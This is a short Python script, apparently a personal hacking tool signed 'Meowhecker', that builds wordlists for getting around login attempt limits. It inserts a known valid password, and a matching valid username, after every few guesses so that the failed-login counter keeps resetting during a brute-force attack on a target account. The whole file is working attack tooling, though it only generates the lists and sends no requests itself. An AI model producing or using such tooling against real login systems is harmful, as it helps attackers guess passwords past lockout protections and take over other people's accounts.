#!/usr/bin/python3

# Explioit - Reset Mechanism
# Some sysetms will reset the limt Counter When the user login successfully

import argparse
import traceback


class Color:
    
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def moewBanner():
    print(Color.HEADER + "##################################################")
    print("#                                                #")
    print("#          " + Color.GREEN + "MeowHecker is a cat. ^O^" + Color.HEADER + "              #")
    print("#                                                #")
    print("##################################################" + Color.ENDC)

    print(Color.WARNING+"-> Author: Meowhecker\n" + Color.ENDC)


def readWordlistToList(filePath):
    
    list = []
    try:
        with open(filePath, "r") as wordlist:

            for line in wordlist:
                list.append(line.rstrip()) # Remove "/n"    

            print("List:", list)
            wordlist.close()
        
        return list
    except FileNotFoundError:
        print("File not found:", filePath)
    except Exception as e:
        print("Error", e)


def MakeBypassWordList(originalWordList,BypassWordlistPath,attemptLimit):

    with open(BypassWordlistPath,'w') as bypassWordlist: 

        for Counter, line in enumerate(originalWordList,start=1):  #Using Enumereate Function to traverse whole list and assing index ! (Start Counter = 1)
            
            bypassWordlist.write(line+'\n')
            
            # Condiction -> Insert Valid String.
            if Counter % (attemptLimit-1) == 0: 
                #print("Insert", valid, "in bypassWordlist") 
                bypassWordlist.write(valid+'\n')

        print("BypassWordlist Done !")
        bypassWordlist.close() 
        return Counter # Number of lines (For Making usernameList)


def MakeUsernameWordlist(TargetUserName, ValidUserName, bypassWordlistLinsNum,attemptLimit):

    with open(userWordlistPath,'w') as userWordlist:
        Counter = 1
        for  line in range(bypassWordlistLinsNum):
            userWordlist.write(TargetUserName+'\n')

            if Counter % (attemptLimit-1) == 0 :

                    #print("Insert", ValidUserName, "in userWordlist") 
                    userWordlist.write(ValidUserName+'\n')
            
            Counter = Counter + 1
        print("UserWordlist - Done !")
        userWordlist.close()
    

# Main() !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

# Configure Parameters

parsers = argparse.ArgumentParser(description='Meowhecker is a Cat')
parsers.add_argument("attemptLimit", type=int)
parsers.add_argument("valid", type= str)
parsers.add_argument("targetUserName", type=str)
parsers.add_argument("validUserName", type=str)
parsers.add_argument("-O", "--originalWordList", default="./defaultWordlist.txt")
parsers.add_argument("-B", "--bypassWordlist", default="./bypassWordlist.txt")
parsers.add_argument("-U", "--userWordlist", default="./userWordlist.txt")
args = parsers.parse_args()

originalWordList = args.originalWordList
BypassWordlistPath = args.bypassWordlist
attemptLimit = args.attemptLimit
valid = args.valid
targetUserName= args.targetUserName
validUserName = args.validUserName
userWordlistPath = args.userWordlist


moewBanner()

DefaultWordList = readWordlistToList(originalWordList)
bypassWordlistLinsNum = MakeBypassWordList(DefaultWordList,BypassWordlistPath,attemptLimit)
MakeUsernameWordlist(targetUserName,validUserName,bypassWordlistLinsNum, attemptLimit)


